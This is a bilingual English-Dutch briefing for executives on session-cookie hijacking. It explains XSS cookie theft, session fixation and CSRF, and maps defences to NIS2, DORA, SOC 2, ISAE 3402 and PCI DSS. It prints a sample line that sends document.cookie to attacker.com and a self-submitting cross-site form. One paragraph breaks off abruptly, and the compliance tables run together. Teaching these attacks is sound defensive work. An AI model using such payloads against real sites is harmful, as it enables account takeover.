Cookie hijacking. How attackers use borrowed credentials. Cookie-kaperij. Hoe aanvallers geleende inloggegevens misbruiken.

A stolen cookie means stolen authentication. With it, attackers get into systems without the password, skip the multi-factor authentication the user already passed, and act as that user towards downstream systems. Een gestolen cookie betekent gestolen authenticatie. Daarmee komen aanvallers binnen zonder wachtwoord, slaan ze de multifactorauthenticatie over die de gebruiker al had doorlopen, en treden ze op als die gebruiker richting andere systemen.

Your web app renders a customer comment without encoding it, or loads an outdated third-party script. That is an XSS flaw. An attacker uses it to run their own JavaScript on your app's pages, in your users' browsers. One line, fetch('https://attacker.com/steal?c=' + document.cookie), sends your app's cookies to the attacker, including the session cookie if it lacks the HttpOnly flag. The attacker now holds a logged-in session to your app. The user sees nothing, and the padlock is still there. Logging out helps only if your app ends the session on the server.

Business impact: the attacker gets into the user's account without the password, because the session already passed multi-factor authentication. They can move money, read data, change permissions and act as the user towards systems that trust the session.

Uw webapplicatie toont een klantreactie zonder die te coderen, of laadt een verouderd script van een derde partij. Dat is een XSS-lek. Een aanvaller gebruikt het om eigen JavaScript op de pagina's van uw applicatie te draaien, in de browser van uw gebruikers. Eén regel, fetch('https://attacker.com/steal?c=' + document.cookie), stuurt de cookies van uw applicatie naar de aanvaller, ook de sessiecookie als die de HttpOnly-vlag mist. De aanvaller heeft nu een ingelogde sessie in uw applicatie. De gebruiker merkt niets en het hangslot staat er nog. Uitloggen helpt alleen als uw applicatie de sessie op de server beëindigt.

Bedrijfsimpact: de aanvaller komt in het account zonder wachtwoord, omdat de sessie de multifactorauthenticatie al heeft doorlopen. Hij kan geld overmaken, gegevens lezen, rechten wijzigen en optreden als de gebruiker richting systemen die de sessie vertrouwen.

The attacker visits the login page first and is given session ID "12345". They send a user a link that carries that same ID. The user clicks and logs in, and the application keeps the existing session ID instead of issuing a new one. User and attacker now share one logged-in session, and the attacker never needed a password. A second variant: the application hands out session IDs in sequence (1, 2, 3…) or with weak randomness. A user is logged in to your web app. To make an embedded widget or single sign-on work, the session cookie is set with SameSite=None, so the browser sends it along with requests from any site. The user then opens a page on attacker.com. That page holds a hidden form that submits itself: <form method="POST" action="https://app.example/transfer">. The browser sends the request with the user's session cookie. Your app sees a logged-in request and carries it out. This is CSRF. Since 2020, Chromium browsers such as Chrome and Edge treat cookies without a SameSite setting as Lax, which blocks this form post. The gap reopens with SameSite=None, or with actions that a plain link can trigger.

Business impact: an attacker can have the user's browser carry out actions the user never intended: transfers, permission changes, a new email address on the account, deletions. In your logs the request looks legitimate.

Een gebruiker is ingelogd in uw webapplicatie. Om een ingesloten widget of single sign-on te laten werken, staat de sessiecookie op SameSite=None. Het gat gaat weer open met SameSite=None, of bij acties die een gewone link kan starten.

HttpOnly stops JavaScript theft but not network interception. The Secure flag stops interception but not fixation. SameSite stops CSRF but not XSS. None of these alone are enough. The weakest link breaks the chain. De kern voor de directie: cookiebeveiliging gaat niet over één vlag of één regel. Het gaat om gelaagde verdediging: meerdere lagen die samenwerken. HttpOnly stopt diefstal via JavaScript, maar geen netwerkonderschepping. De Secure-vlag stopt onderschepping, maar geen fixatie. SameSite stopt CSRF, maar geen XSS. Geen ervan is alleen voldoende. De zwakste schakel breekt de keten.

NIS2Art. 21 requires risk-management measures including access control, multi-factor authentication and secure development. Session management falls under these. In the Netherlands this is the Cyberbeveiligingswet (Cbw), in force since 15 August 2026.Ask for evidence of HttpOnly, Secure and SameSite on all authentication cookies, and of sessions being ended on logout and password change. A third-party test worth its name includes cookie handling in its XSS and CSRF checks.Session theft used to access systems can count as a significant incident if it meets the thresholds: early warning within 24 hours of becoming aware, incident notification within 72 hours, final report within one month. Revoke the affected sessions.
DORAFor financial entities, DORA (Art. 9) requires strong authentication mechanisms and access controls; session management is part of that. DORA has applied since 17 January 2025.Ask for proof of cookie security settings and test evidence. A general statement that "secure cookies are used" says little without specifics.Account takeover via stolen cookies can count as a major ICT-related incident if it meets the classification criteria: initial notification within 4 hours of classifying it as major (at most 24 hours after becoming aware), intermediate report within 72 hours, final report within one month.
SOC 2Session management, authentication and access control fall under CC6 (logical access). Session fixation, XSS-based theft and CSRF are common audit findings.Worth checking that the report covers cookie flags, session timeouts and how sessions are invalidated, with test evidence rather than configuration screenshots.The deviation (missing cookie flags, session hijacking, weak session IDs) appears in the next report. Customers will ask for a remediation timeline and confirmation of no unauthorised access.
ISAE 3402Assurance over outsourced processes relevant to financial reporting. Session handling is rarely in scope unless the application itself processes transactions that feed the books, such as payments or orders.Read the control objectives. If logins and sessions of the customer-facing application are not among them, the report says nothing about session theft, however reassuring the opinion looks.ISAE 3402 creates no duty to notify user auditors. Expect a deviation in the next report, and ask for interim disclosure in the contract.
PCI DSS 4.0.1Req. 6.2.4 asks for development practices that prevent attacks such as XSS and CSRF; 8.2.8 requires re-authentication after 15 minutes idle. Since 31 March 2025, 6.4.3 (inventory and authorise every payment-page script) and 11.6.1 (detect changes to those scripts and headers) are mandatory.Ask for the payment-page script inventory, evidence of session timeouts and logout, and XSS/CSRF test results. "Secure by default" is not proof.If cardholder data was exposed, your incident response plan (req. 12.10.1) covers notifying the card brands and acquirer.
